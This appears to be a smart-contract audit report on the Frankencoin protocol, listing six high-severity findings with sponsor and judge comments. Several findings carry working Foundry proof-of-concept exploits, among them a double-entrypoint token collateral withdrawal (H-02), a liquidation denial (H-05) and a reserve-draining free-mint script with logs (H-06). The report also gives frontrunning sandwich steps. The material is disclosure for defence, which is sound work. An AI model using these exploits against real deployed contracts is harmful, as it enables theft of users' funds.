[H-01] Challenges can be frontrun with de-leveraging to cause lossses for challengers
Submitted bycarrotsmuggler, also found bymov,bin2chen,juancito,KIntern_NA,Ace-30,cccz,Nyx,nobody2018, andmahdikarimi
Challenges, once created, cannot be closed. Thus once a challenge is created, the challenger has already transferred in a collateral amount and is thus open for losing their collateral to a bidding war which will most likely close below market price, since otherwise buying from the market would be cheaper for bidders.
Position owners can take advantage of this fact and frontrun alaunchChallengetransaction with anadjustPricetransaction. TheadjustPricefunction lets the user lower the price of the position, and can pass the collateral check by sending collateral tokens externally.
As a worst case scenario, consider a case where a position is open with 1 ETH collateral and 1500 ZCHF minted. A challenger challenges the position and the owner frontruns the challenger by sending the contract 1500 ZCHF and callingrepay()and then callingadjustPricewith value 0, all in one transaction with a contract. Now, the price in the contract is set to 0, and the collateral check passes since the outstanding minted amount is 0. The challenger’s transaction gets included next, and they are now bidding away their collateral, since any amount of bid will pass the avert collateral check.
The position owner themselves can backrun the same transaction with a bid of 1 wei and take all the challenger’s collateral, since every bid checks for thetryAvertChallengecondition.
if(_bidAmountZCHF*ONE_DEC18>=price*_collateralAmount)
Since price is set to 0, any bid passes this check. This sandwich attack causes immense losses to all challengers in the system, baiting them with bad positions and then sandwiching their challenges.
Since sandwich attacks are extremely commonplace, this is classified as high severity.
Proof of Concept
The attack can be performed the following steps.
Have an undercollateralized position. This can be caused naturally due to market movements.Frontrun challenger’s transaction with a repayment andadjustPricecall lowering the price.Challenger’s call gets included, where they now put up collateral for bids.Backrun challenger’s call with a bid such that it triggers the avert.Attacker just claimed the challenger’s collateral at their specified bid price, which can be as little as 1 wei if price is 0.
Recommended Mitigation Steps
When launching a challenge, ask for aexpectedPriceargument. If the actual price does not match this expected price, that means that transaction was frontrun and should be reverted. This acts like a slippage check for challenges.
0xA5DF (lookout) commented:
I have some doubts about severity, since the auction’s final bid is expected to be at about the worth of the collateral.
So the challenger isn’t expected to lose anything but the challenge reward.
luziusmeisser (Frankencoin) confirmed and commented:
This is actually a high risk issue as the challenge is ended early as soon as the highest bid reaches the liquidation price.I would even say that this is one of the most valuable findings I’ve seen so far!The fix is to add front-running protection to the launchChallenge function:function launchChallenge(address _positionAddr, uint256 _collateralAmount, uint256 expectedPrice) external validPos(_positionAddr) returns (uint256) {IPosition position = IPosition(_positionAddr);if (position.price() != expectedPrice) revert UnexpectedPrice();
hansfriese (judge) commented:
Since the owner lowers the price of the position, the collateral for a challenge is worth nothing, and the challengers might lose their collateral. So I agree with the sponsor.

[H-02] Double-entrypoint collateral token allows position owner to withdraw underlying collateral without repaying ZCHF
Submitted bygiovannidisiena, also found bybin2chen,tallo, andJ4de
Position::withdrawis intended to allow the position owner to withdraw any ERC20 token which might have ended up at position address. If the collateral address is passed as argument thenPosition::withdrawCollateralis called to perform the necessary checks and balances. However, this can be bypassed if the collateral token is a double-entrypoint token.
Such tokens are problematic because the legacy token delegates its logic to the new token, meaning that two separate addresses are used to interact with the same token. Previous examples include TUSD which resulted invulnerability when integrated into Compound. This highlights the importance of carefully selecting the collateral token, especially as this type of vulnerability is not easily detectable. In addition, it is not unrealistic to expect that an upgradeable collateral token could become a double-entrypoint token in the future, e.g. USDT, so this must also be considered.
This vector involves the position owner dusting the contract with the collateral token’s legacy counterpart which allows them to withdraw the full collateral balance by callingPosition::withdrawpassing the legacy address astokenargument. This behaviour is flawed as the position owner should repay the ZCHF debt before withdrawing their underlying collateral.
Proof of Concept
Apply the following git diff:
diff --git a/.gitmodules b/.gitmodulesindex 888d42d..e80ffd8 100644--- a/.gitmodules+++ b/.gitmodules@@ -1,3 +1,6 @@[submodule "lib/forge-std"]path = lib/forge-stdurl = https://github.com/foundry-rs/forge-std+[submodule "lib/openzeppelin-contracts"]+	path = lib/openzeppelin-contracts+	url = https://github.com/openzeppelin/openzeppelin-contractsdiff --git a/lib/openzeppelin-contracts b/lib/openzeppelin-contractsnew file mode 160000index 0000000..0a25c19--- /dev/null+++ b/lib/openzeppelin-contracts@@ -0,0 +1 @@+Subproject commit 0a25c1940ca220686588c4af3ec526f725fe2582diff --git a/test/DoubleEntryERC20.sol b/test/DoubleEntryERC20.solnew file mode 100644index 0000000..b871288--- /dev/null+++ b/test/DoubleEntryERC20.sol@@ -0,0 +1,74 @@+// SPDX-License-Identifier: MIT+pragma solidity ^0.8.0;++import "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";+import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";++interface DelegateERC20 {+    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);+    function delegateBalanceOf(address account) external view returns (uint256);+}++contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {+    DelegateERC20 public delegate;++    constructor() {+        _mint(msg.sender, 100 ether);+    }++    function mint(address to, uint256 amount) public onlyOwner {+        _mint(to, amount);+    }++    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {+        delegate = newContract;+    }++    function transfer(address to, uint256 value) public override returns (bool) {+        if (address(delegate) == address(0)) {+            return super.transfer(to, value);+        } else {+            return delegate.delegateTransfer(to, value, msg.sender);+        }+    }++    function balanceOf(address account) public view override returns (uint256) {+        if (address(delegate) == address(0)) {+            return super.balanceOf(account);+        } else {+            return delegate.delegateBalanceOf(account);+        }+    }+}++contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {+    address public delegatedFrom;++    constructor(address legacyToken) {+        delegatedFrom = legacyToken;+        _mint(msg.sender, 100 ether);+    }++    modifier onlyDelegateFrom() {+        require(msg.sender == delegatedFrom, "Not legacy contract");+        _;+    }++    function mint(address to, uint256 amount) public onlyOwner {+        _mint(to, amount);+    }++    function delegateTransfer(address to, uint256 value, address origSender)+        public+        override+        onlyDelegateFrom+        returns (bool)+    {+        _transfer(origSender, to, value);+        return true;+    }++    function delegateBalanceOf(address account) public view override onlyDelegateFrom returns (uint256) {+        return balanceOf(account);+    }+}diff --git a/test/GeneralTest.t.sol b/test/GeneralTest.t.solindex 402416d..9ce13cd 100644--- a/test/GeneralTest.t.sol+++ b/test/GeneralTest.t.sol@@ -14,6 +14,7 @@ import "../contracts/MintingHub.sol";import "../contracts/PositionFactory.sol";import "../contracts/StablecoinBridge.sol";import "forge-std/Test.sol";+import {LegacyToken, DoubleEntryPoint} from "./DoubleEntryERC20.sol";contract GeneralTest is Test {@@ -24,6 +25,8 @@ contract GeneralTest is Test {TestToken col;IFrankencoin zchf;+    LegacyToken legacy;+    DoubleEntryPoint doubleEntry;User alice;User bob;@@ -35,10 +38,41 @@ contract GeneralTest is Test {hub = new MintingHub(address(zchf), address(new PositionFactory()));zchf.suggestMinter(address(hub), 0, 0, "");col = new TestToken("Some Collateral", "COL", uint8(0));+        legacy = new LegacyToken();+        doubleEntry = new DoubleEntryPoint(address(legacy));alice = new User(zchf);bob = new User(zchf);}+    function testPoCWithdrawDoubleEntrypoint() public {+        alice.obtainFrankencoins(swap, 1000 ether);+        emit log_named_uint("alice zchf balance before opening position", zchf.balanceOf(address(alice)));+        uint256 initialAmount = 100 ether;+        doubleEntry.mint(address(alice), initialAmount);+        vm.startPrank(address(alice));+        doubleEntry.approve(address(hub), initialAmount);+        uint256 balanceBefore = zchf.balanceOf(address(alice));+        address pos = hub.openPosition(address(doubleEntry), 100, initialAmount, 1000000 ether, 100 days, 1 days, 25000, 100 * (10 ** 36), 200000);+        require((balanceBefore - hub.OPENING_FEE()) == zchf.balanceOf(address(alice)));+        vm.warp(Position(pos).cooldown() + 1);+        alice.mint(pos, initialAmount);+        vm.stopPrank();+        emit log_named_uint("alice zchf balance after opening position and minting", zchf.balanceOf(address(alice)));++        uint256 legacyAmount = 1;+        legacy.mint(address(alice), legacyAmount);+        uint256 totalAmount = initialAmount + legacyAmount;+        vm.prank(address(alice));+        legacy.transfer(pos, legacyAmount);+        legacy.delegateToNewContract(doubleEntry);++        vm.prank(address(alice));+        Position(pos).withdraw(address(legacy), address(alice), initialAmount);+        emit log_named_uint("alice collateral balance after withdrawing collateral", doubleEntry.balanceOf(address(alice)));+        emit log_named_uint("alice zchf balance after withdrawing collateral", zchf.balanceOf(address(alice)));+        console.log("uh-oh, alice withdrew collateral without repaying zchf ://");+    }+function initPosition() public returns (address) {alice.obtainFrankencoins(swap, 1000 ether);address pos = alice.initiatePosition(col, hub);
Tools Used
Manual reviewFoundry
Recommended Mitigation
Validate the collateral balance has not changed after the token transfer within the call toPosition::withdraw.Otherwise, consider restricting the use ofPosition::withdrawor remove it altogether.
luziusmeisser (Frankencoin) confirmed and commented:
Excellent hint, thanks!
hansfriese (judge) commented:
Great catch, reported with a reference URL and coded POC. Satisfactory report.

[H-03] When the challenge is successful, the user can send tokens to the position to avoid the position’s cooldown period being extended
Submitted bycccz, also found bymahdikarimi
When the challenge is successful, internalWithdrawCollateral will be called to transfer the collateral in the position. Note that the cooldown period of the position will be extended until the position expires only if the collateral in the position is less than minimumCollateral, if the user sends collateral to the position in advance, then the cool down period of the position will not be extended.
functioninternalWithdrawCollateral(addresstarget,uint256amount)internalreturns(uint256) {IERC20(collateral).transfer(target,amount);uint256balance=collateralBalance();if(balance<minimumCollateral){cooldown=expiration;}emitUpdate();returnbalance;}
I will use the following example to illustrate the severity of the issue.
Consider WETH:ZCHF=2000:1, the position has a challenge period of 3 days and the minimum amount of collateral is 1 WETH.
alice clones the position, offering 1 WETH to mint 0 zchf.alice adjusts the price to 10e8, the cooldown period is extended to 3 days later.bob offers 1 WETH to launch the challenge and charlie bids 1800 zchf.Since bob has already covered all collateral, other challengers are unprofitable and will not launch new challengesAfter 3 days, the cooldown period ends and the challenge expires.bob calls end() to end the challenge.alice observes bob’s transaction and uses MEV to send 1 WETH to the position in advance.bob’s transaction is executed, charlie gets the 1 WETH collateral in the position, and alice gets most of the bid.Since the position balance is still 1 WETH, the position cooldown period does not extend to the position expiration.
10.Since the position is not cooldown and there is no challenge at this point, alice uses that price to mint 10e8 zchf.
Proof of Concept
https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L268-L276https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329-L354https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L252-L276
Recommended Mitigation Steps
Consider extending the cooldown period of the position even if the challenge is successful
luziusmeisser (Frankencoin) commented:
Excellent finding! Will implement 1 day cooldown on successful challenges.

[H-04] Transfer position ownership toaddr(0)to DoSend()challenge
Submitted by__141345__
If some challenge is about to succeed, the position owner will lose the collateral. Seeing the unavoidable loss, the owner can transfer the position ownership toaddr(0), fail theend()call of the challenge. At the end, the DoS inend()will have these impacts:
the successful bidder will lose bid fund.the challenger’s collateral will be locked, and lose the challenge reward.
Proof of Concept
Assuming, the position hasminimumCollateralof 600 zchf, the position owner minted 1,000 zchf against some collateral worth of 1,100 zchf, the highest bid for the collateral was 1,060 zchf, the challenge reward being 50. Then inPosition.sol#notifyChallengeSucceeded(), therepaymentwill be 1,000, buteffectiveBidworth of 1,060. ThefundNeededwill be 1,000 + 50 = 1,050, and results in excess of 1,060 - 1,050 = 10 to refund the position owner in line 268MintingHub.sol. In addition, due to theminimumCollaterallimit, this challenge cannot be split into smaller ones.
File:contracts/MintingHub.sol252:functionend(uint256_challengeNumber,boolpostponeCollateralReturn)public{260:         (addressowner,uint256effectiveBid,uint256volume,uint256repayment,uint32reservePPM) =challenge.position.notifyChallengeSucceeded(recipient,challenge.bid,challenge.size);261:if(effectiveBid<challenge.bid) {262:// overbid, return excess amount263:IERC20(zchf).transfer(challenge.bidder,challenge.bid-effectiveBid);264:         }265:uint256reward= (volume*CHALLENGER_REWARD) /1000_000;266:uint256fundsNeeded=reward+repayment;267:if(effectiveBid>fundsNeeded){268:zchf.transfer(owner,effectiveBid-fundsNeeded);File:contracts/Position.sol329:functionnotifyChallengeSucceeded(address_bidder,uint256_bid,uint256_size)externalonlyHubreturns(address,uint256,uint256,uint256,uint32) {349:uint256repayment=minted<volumeZCHF?minted:volumeZCHF;// how much must be burned to make things even350:351:notifyRepaidInternal(repayment);// we assume the caller takes care of the actual repayment352:internalWithdrawCollateral(_bidder,_size);// transfer collateral to the bidder and emit update353:return(owner,_bid,volumeZCHF,repayment,reserveContribution);354:     }
From the position owner’s point of view, the position is on auction and has incurred loss already, only 10 zchf refund left. The owner can give up the tiny amount, and transfer the ownership toaddr(0)to DoS theend()call.
When the positionownerisaddr(0), the transfer in line 268MintingHub.solwill revert, due to the requirement in zchf (inherited fromERC20.sol):
File:contracts/ERC20.sol151:function_transfer(addresssender,addressrecipient,uint256amount)internalvirtual{152:require(recipient!=address(0));
Now the successful bidder can no longer callend(). The bid fund will be lost. Also the challenger will lose the collateral because the return call encounter DoS too.
Recommended Mitigation Steps
Disallow transferring position ownership toaddr(0)
0xA5DF (lookout) commented:
The need to prevent transferring to the zero address is already mentioned in the automated findings and was reported by#935, however the impact demonstrated in this report is much more severe than the low severity impact identified by other reports and therefore I believe it should be a separate finding.
luziusmeisser (Frankencoin) confirmed

[H-05] Position owners can deny liquidations
Submitted byJGcarv
Lines of code
https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L159https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L307
Impact
The owner of a vulnerable position can deny being liquidated by setting the price to betype(uint256).max, making every call totryAvertChallengefail due to an overflow.
This means that if it’s advantageous enough the owner can choose to keepzchfand leave the collateral stuck. This could happen in any scenario where a collateral is likely to loose it’s value, for example, de-pegs, runs on the bank, etc.
Test Proof
Here’s a snippet that can be pasted onGeneralTest.t.sol:
functiontest_liquidationDenial()public{test01Equity();// ensure there is some equity to burnaddressposAddress=initPosition();Positionpos=Position(posAddress);skip(15*86_400+60);alice.mint(address(pos),1001);vm.prank(address(alice));pos.adjustPrice(type(uint256).max);col.mint(address(bob),1001);uint256first=bob.challenge(hub,posAddress,1001);bob.obtainFrankencoins(swap,55_000ether);vm.expectRevert();bob.bid(hub,first,10_000ether);skip(7*86_400+60);vm.expectRevert();hub.end(first,false);}
0xA5DF (lookout) commented:
I think the real issue here is that you can’t end the challenge (as shown in the last line of the PoC), that will cause a loss of funds for challenger and disincentivize users from challenging the position.
luziusmeisser (Frankencoin) confirmed and commented:
Ouch, this is a good one.
hansfriese (judge) commented:
Great finding with coded POC. As the presort mentioned, the impact is the same as#670, but this has a different exploit path. Satisfactory.

[H-06]CHALLENGER_REWARDcan be used to drain reserves and free mint
Submitted byLirios, also found byshalaamum,juancito,0xDACA,Kumpa,__141345__,__141345__,bin2chen,cccz,said,tallo,juancito,Emmanuel,BenRai,jangle,T1MOH,bughunter007,juancito,cccz,nobody2018,SpicyMeatball,117l11,117l11,ChrisTina, andvakzz
The goal of the auction mechanism is to determine the fair price of the collateral, so that Frankencoin (ZCHF) is always sufficiently backed and the system remains in balance.
If the challenge is successful, the bidder gets the collateral from the position and the position is closed, distributing excess proceeds to the reserve and paying a reward to the challenger.
The reward for the challenger is based on the user provided price and can be abused to have the protocol pay unlimited rewards.
Proof of Concept
When a challenge ends without being Averted, theend()function can be called to process the liquidation.
This process pays back the mintedZCHFtokens with the bid and sends the collateral to the bidder. The challenger receives back the collateral he supplied when starting the challenge, and receives aCHALLENGER_REWARDof 2% of the challenged collateral value inZCHF.
To calculate the value of the reward, it usesuint256 reward = (volume * CHALLENGERREWARD) / 1000\000;withvolumebeing thevolumeZCHFvalue returned fromPosition.notifyChallengeSucceeded()This is calculated asuint256 volumeZCHF = _mulD18(price, _size);// How much could have minted with the challenged amount of the collateralmeaning that if the price is very high, the theoretical volumeZCHF  will be very high too.
When there are insufficient funds in the Position to pay for the reward,FrankenCoin.notifyLoss()is used to get the funds from the reserve and mint new coins.
The price of a Position can be set when it is created, or later by the owner via an adjustPrice call.The steps to take:
Position owner mints the maximum ZCHF.Position owner adjusts price and sets it to a very large value.Owner immediately starts a challenge via MintingHub
When price is very high, if there are bids, they will never pass the AvertChallenge check of_bidAmountZCHF * ONE_DEC18 >= price * _collateralAmountso the Challenge will always succeed.After the challenge period, the end()  function can be called, and Challenger will receive a high amount of ZCHF as a fee.
An alternative and faster way is to create a new position and immediately challenge it.
When creating a Position,_challengeSecondscan be set to 0 and callinglaunchChallengeis possible before Position start waiting time is over. This makes it possible for any user to drain all reserves and mint a large number of ZCHF in 1 transaction.
POC Script
A proof of concept testscript is created to demonstrate the vulnerability.
This code was added toGeneralTest.t.sol
functionshowBalances()public{addresshacker=0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01;console.log('================ Balances ================');console.log('hacker xchf     :',xchf.balanceOf(hacker)/1e18);console.log('hacker zchf     :',zchf.balanceOf(hacker)/1e18);console.log('reserver zchf   :',zchf.balanceOf(address(zchf.reserve()))/1e18);console.log('zchf.totalSupply:',zchf.totalSupply()/1e18);console.log(' ');}functiontest10AbuseChallengeReward()public{test04Mint();// let bob/alice open position so not all is empty// init, start wit 2 xchf and 1000 zhfaddresshacker=0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01;TestTokenxchf_=TestToken(address(swap.chf()));xchf_.mint(address(hacker),1002ether);vm.startPrank(hacker);xchf_.approve(address(swap),1000ether);swap.mint(1000ether);showBalances();// open a position with fake inflated price and dummy collateral.// _challengeSeconds to 0 so we can immediately challenge and endxchf_.approve(address(hub),1ether);// collateralzchf.approve(address(hub),1000ether);// 1000 OPENING_FEEaddressmyPosition=hub.openPosition(address(xchf_),// _collateralAddress,1ether,// _minCollateral1ether,// _initialCollateral1000ether,// _mintingMaximum3days,// _initPeriodSeconds minimum perios10days,// _expirationSeconds0,// _challengeSeconds set to 0 to immediately challenge and end0,//_mintingFeePPM,type(uint256).max/1e20,// _liqPrice - huge inflated price0// _reservePPM);console.log('Creates our Position with inflated price, 1000 opening fee to reserves 1 xchf as collateral');showBalances();console.log('Start launchChallenge and immediately end the auction.');console.log('We will receive the 1 xchf collateral back');console.log('and 2% of inflated collateral price in zchf as CHALLENGER_REWARD');console.log('zchf is first taken all from reserve, and rest minted');xchf_.approve(address(hub),1ether);// collateraluint256challengeID=hub.launchChallenge(myPosition,1ether);hub.end(challengeID);showBalances();vm.stopPrank();}
The results of the test
[PASS] test10AbuseChallengeReward() (gas: 3939346)Logs:================ Balances ================hacker xchf     : 2hacker zchf     : 1000reserver zchf   : 23500zchf.totalSupply: 102000We have creates our Position with inflated price================ Balances ================hacker xchf     : 1hacker zchf     : 0reserver zchf   : 24500zchf.totalSupply: 102000Start launchChallenge and immediately end the auction.We will receive the 1 xchf collateral backand 2% of inflated collateral price in zchf as CHALLENGER_REWARDzchf is first taken all from reserve, and rest minted================ Balances ================hacker xchf     : 2hacker zchf     : 23158417847463239084714197001737581570reserver zchf   : 0zchf.totalSupply: 23158417847463239084714197001737659070
Tools Used
Manual review, forge
Recommended Mitigation Steps
It would be recommeded to restrict the moments when challenges can be started so Positions cannot be challenged before start time and when they are denied.
This will make challenges only possible when a position once was valid, with a valid price.
To prevent owners to change the price of their Position to an extremenly large value, it can be limited to change the price max x% per adjustment.
luziusmeisser (Frankencoin) confirmed and commented:
This is probably the most important issue revealed during the audit. The warden deserves a big reward for this!

